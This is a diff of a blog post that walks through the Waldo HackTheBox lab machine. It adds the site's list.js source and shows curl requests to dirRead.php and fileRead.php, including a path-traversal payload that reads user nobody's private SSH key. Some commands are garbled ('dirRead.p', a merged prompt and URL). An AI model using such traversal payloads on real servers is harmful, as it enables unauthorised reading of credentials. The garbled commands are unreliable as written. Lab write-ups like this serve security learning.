@@ -66,8 +66,51 @@ By inspecting with chrome development tool, we can find that it is html web page
 
 In that file, there are some interesting php path in some functions.
 
-For instance, dirRead.php has Directory Traversal.<br>
-Which means we can see any directory on Waldo.
+{% highlight shell %}
+root@kali:/home/sabonawa# curl -i http://10.10.10.87/list.js
+HTTP/1.1 200 OK
+Server: nginx/1.12.2
+Date: Tue, 18 Sep 2018 21:34:34 GMT
+Content-Type: application/javascript
+Content-Length: 6245
+Last-Modified: Thu, 03 May 2018 20:48:36 GMT
+Connection: keep-alive
+ETag: "5aeb75a4-1865"
+Expires: Sun, 23 Sep 2018 21:34:34 GMT
+Cache-Control: max-age=432000
+Accept-Ranges: bytes
+
+~~~
+
+function readDir(path){ 
+	var xhttp = new XMLHttpRequest();
+	xhttp.open("POST","dirRead.php",false);
+	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	xhttp.send('path=' + path);
+	if (xhttp.readyState === 4 && xhttp.status === 200) {
+		return xhttp.responseText;
+	}else{
+	}
+}
+
+
+function readFile(file){ 
+	var xhttp = new XMLHttpRequest();
+	xhttp.open("POST","fileRead.php",false);
+	xhttp.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+	xhttp.send('file=' + file);
+	if (xhttp.readyState === 4 && xhttp.status === 200) {
+		return xhttp.responseText;
+	}else{
+	}
+}
+
+~~~
+
+{% endhighlight %}
+
+For instance, dirRead.php has Directory Traversal(?).<br>
+Which means we can see any directory on Waldo if we have a permission.
 {% highlight shell %}
 root@kali:~# curl -i -X POST http://10.10.10.87/dirRead.p "Content-Type: application/x-www-form-urlencoded" -d "path=./" 
 HTTP/1.1 200 OK
@@ -81,7 +124,8 @@ X-Powered-By: PHP/7.1.16
 [".","..",".list","background.jpg","cursor.png","dirRead.php","face.png","fileDelete.php","fileRead.php","fileWrite.php","index.php","list.html","list.js"]
 {% endhighlight %}
 
-In addition, taking advantage of fileRead.php, we can achieve one private key of private key for user nobody.
+In addition, by taking advantage of fileRead.php, we can achieve one private key of private key for user nobody.
+
 {% highlight shell %}
 root@kali:/homefileRead.php -H "Content-Type: application/x-www-form-urlencoded" -d "file=....//....//....//home/nobody/.ssh/.monitor"
 HTTP/1.1 200 OK
